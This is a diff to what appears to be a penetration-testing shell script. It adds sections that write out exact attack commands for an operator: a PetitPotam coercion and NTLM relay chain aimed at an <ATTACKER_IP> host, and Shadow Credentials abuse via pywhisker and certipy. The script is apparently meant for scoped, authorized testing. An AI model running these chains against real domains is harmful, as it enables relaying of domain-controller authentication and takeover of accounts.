@@ -139,4 +139,62 @@ if have rpcclient && [ -n "${ENUM_DC_IP:-}" ]; then
     fi
 fi
 
+# ---------- 7. PetitPotam / coercion next-step hints (D1.1) ----------
+# Per ADR-004 D5: coerce probes are detection-only here. If petitpotam.py
+# is installed AND we identified a lsarpc-reachable DC above, emit the EXACT
+# follow-up command the operator would run (under their own scoping).
+# Never auto-fires the coerce — that requires an attacker-controlled relay.
+if [ -n "${ENUM_DC_IP:-}" ] && [ -s "$OUT/_relay_candidates.txt" ]; then
+    relay_count=$(wc -l < "$OUT/_relay_candidates.txt")
+    {
+        echo "# PetitPotam coerce + NTLM relay chain (operator-opt-in only)"
+        echo "# Pre-reqs:"
+        echo "#   - $relay_count signing-disabled relay candidate(s) in _relay_candidates.txt"
+        echo "#   - DC at ${ENUM_DC_IP} with reachable \\pipe\\lsarpc"
+        echo "#   - You control the attacker IP <ATTACKER_IP>"
+        echo "#"
+        echo "# Step 1 (terminal A) — start ntlmrelayx against a signing-disabled target:"
+        echo "#   impacket-ntlmrelayx -t smb://<RELAY_TARGET> -smb2support --no-http-server"
+        echo "#"
+        if have petitpotam.py; then
+            echo "# Step 2 (terminal B) — coerce DC auth to ATTACKER_IP via PetitPotam:"
+            echo "#   petitpotam.py -u '$ENUM_USER' -p '$ENUM_PASS' \\"
+            echo "#                 -d '${ENUM_DOMAIN:-CORP.LOCAL}' \\"
+            echo "#                 <ATTACKER_IP> ${ENUM_DC_IP}"
+            echo "#   (also try: dfscoerce.py, coercer.py for fallback vectors)"
+        else
+            echo "# Step 2 (terminal B) — INSTALL petitpotam.py first:"
+            echo "#   pipx install impacket   # provides petitpotam.py"
+            echo "# Then coerce DC auth to ATTACKER_IP via PetitPotam (see impacket docs)."
+        fi
+    } > "$OUT/_petitpotam_hint.txt"
+    err "HIGH: PetitPotam coerce chain available — see _petitpotam_hint.txt for the exact commands"
+fi
+
+# ---------- 8. Shadow Credentials viability hint (D1.1) ----------
+# Shadow Credentials (msDS-KeyCredentialLink write) works when:
+#   - LDAP signing is NOT required on the DC (or you have NTLM channel binding bypass)
+#   - You have GenericWrite / WriteOwner on a target user/computer object
+#   - Target functional level is 2016+ (KCD trust requires this)
+# We can't determine all of that from SMB alone, but if the operator passes
+# both --user and --dc-ip, the conditions are at least worth surfacing.
+if [ -n "${ENUM_USER:-}" ] && [ -n "${ENUM_DC_IP:-}" ]; then
+    {
+        echo "# Shadow Credentials viability hint (operator follow-up via enum-ldap.sh)"
+        echo "#"
+        echo "# If you discover GenericWrite or WriteOwner on a target user/computer object"
+        echo "# (BloodHound owned-objects path or 'nxc ldap --bloodhound'):"
+        echo "#"
+        echo "#   pywhisker --target <victim-user> -d '${ENUM_DOMAIN:-CORP.LOCAL}' \\"
+        echo "#             -u '$ENUM_USER' -p '<PASS>' --dc-ip ${ENUM_DC_IP} \\"
+        echo "#             --action add"
+        echo "#   certipy account create -u '$ENUM_USER' -p '<PASS>' \\"
+        echo "#             -d '${ENUM_DOMAIN:-CORP.LOCAL}' -dc-ip ${ENUM_DC_IP} \\"
+        echo "#             -target <victim> -shadow"
+        echo "#"
+        echo "# Pre-requisite: msDS-KeyCredentialLink is writable on the target. Check via"
+        echo "# enum-ldap.sh BloodHound output for inbound 'AddKeyCredentialLink' edges."
+    } > "$OUT/_shadow_creds_hint.txt"
+fi
+
 log "smb dispatcher done."
